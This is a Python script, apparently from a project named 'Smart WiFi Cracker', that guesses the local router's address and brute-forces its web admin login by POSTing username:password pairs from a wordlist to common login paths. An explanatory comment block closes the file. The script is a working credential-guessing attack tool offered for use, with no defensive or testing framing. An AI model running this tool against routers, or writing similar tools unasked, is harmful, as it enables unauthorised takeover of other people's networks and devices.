import requests
import socket
import re

def get_default_gateway():
    """Get the router's IP address (default gateway)"""
    try:
        output = socket.gethostbyname(socket.gethostname())
        if output.startswith("192.") or output.startswith("10.") or output.startswith("172."):
            return '.'.join(output.split('.')[:-1]) + '.1'
        else:
            return "192.168.0.1"
    except Exception as e:
        print(f"[!] Failed to get default gateway: {e}")
        return None

def load_credentials(wordlist_path):
    """Load username:password pairs from a file"""
    creds = []
    try:
        with open(wordlist_path, 'r') as f:
            for line in f:
                if ':' in line:
                    creds.append(tuple(line.strip().split(":", 1)))
    except Exception as e:
        print(f"[!] Error loading credentials: {e}")
    return creds

def try_login(router_ip, credentials):
    """Try default credentials to log in to the router"""
    login_paths = ["/login", "/admin", "/"]  # common login paths
    for path in login_paths:
        url = f"http://{router_ip}{path}"
        for username, password in credentials:
            print(f"[*] Trying {username}:{password} at {url}")
            try:
                response = requests.post(url, data={'username': username, 'password': password}, timeout=5)
                if response.status_code in [200, 302] and "logout" in response.text.lower():
                    print(f"[+] Login successful at {url} with {username}:{password}")
                    return url, username, password
            except requests.RequestException:
                continue
    print("[!] No working credentials found.")
    return None, None, None

if __name__ == "__main__":
    wordlist = r"D:\Codes\Smart WiFi Cracker\assets\wordlists\router_creds.txt"  # Use your path
    gateway = get_default_gateway()
    
    if gateway:
        creds = load_credentials(wordlist)
        login_url, user, pwd = try_login(gateway, creds)
        
        if login_url:
            print(f"\n[✓] Logged in to router at {login_url} with credentials {user}:{pwd}")
        else:
            print("\n[✗] Failed to log in to router. Consider manual login or fingerprinting the router model.")


# exlaination of the code:
# This script attempts to log in to a router using a list of common username:password pairs.
# It first retrieves the default gateway IP address, which is typically the router's IP.    
# It then loads a list of credentials from a specified file.
# The script tries to log in to the router by sending POST requests to common login paths.
# If a successful login is found, the script prints the URL, username, and password.
# If no successful login is found, it informs the user.
# The script uses the `requests` library to handle HTTP requests and responses.
# It also handles exceptions to avoid crashing on connection errors.
